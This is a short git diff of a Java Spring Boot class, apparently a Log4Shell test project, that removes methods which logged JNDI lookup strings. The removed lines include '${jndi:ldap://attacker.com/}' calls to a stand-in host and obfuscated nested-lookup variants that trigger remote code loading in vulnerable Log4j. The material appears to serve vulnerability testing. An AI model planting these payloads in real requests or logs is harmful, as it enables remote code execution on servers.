@@ -16,6 +16,7 @@ import javax.sql.DataSource;
 @SpringBootApplication(exclude = {SecurityAutoConfiguration.class})
  public class Log4jApplication {
 
+	private static Logger log = LogManager.getLogger(Log4jApplication.class.getName());
 	@Autowired  DataSource ds;
 	@PostConstruct
 	public void init() throws SQLException {
@@ -28,32 +29,8 @@ import javax.sql.DataSource;
 		}
 	}
 
-	private final int a =10;
-	private final int b=12;
-	 static Logger log = LogManager.getLogger(Log4jApplication.class.getName());
-	public static void main(final String[] args) {
-		SpringApplication.run(Log4jApplication.class, args);
 
-//		ds.getConnection();
-	}
 
-	public   void main(String args) {
-	 	log.info("Started..!");
-		 log.info("Request User Agent:${jndi:ldap://attacker.com/}");
-		 log.info("Done..!");
-		 Log4jApplication la= new Log4jApplication();
-		 la.doAThing();
-		 log.error("Request User Agent:${jndi:ldap://attacker.com/}");
-		 log.error("Request User Agent:${jndi:ldap://attacker.com/}");
-
-	}
-
-	public   int doAThing() {
-		log.info("Malicious log attempt A {}", "${${::-${::-$${::-j}}}}");
-		final int temp = this.a + this.b;
-		log.info("Malicious log attempt B ${${::-${::-$${::-j}}}}");
-		return temp;
-	}
 
 
 }
